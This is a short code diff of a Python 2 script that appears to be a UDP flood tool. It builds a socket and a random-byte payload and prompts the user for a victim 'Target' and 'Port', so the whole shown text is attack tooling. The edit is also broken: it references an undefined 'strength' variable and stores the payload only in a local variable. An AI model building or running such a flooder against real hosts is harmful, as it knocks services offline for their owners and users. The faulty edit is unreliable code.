@@ -11,7 +11,10 @@ def credits():
 	console.set_color(130, 0, 0)
 	print "     -+--=:=-  -++-  -=:=--+-\n"
 client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-bytes = random._urandom(1024) * int(sys.argv[1])
+def byt(strength):
+	bytes = random._urandom(1024) * int(strength)
+if len(str(strength)) == 0:
+	byt(8)
 credits()
 victim = raw_input(' -+- Target: ')
 vport = input(' -+- Port: ')
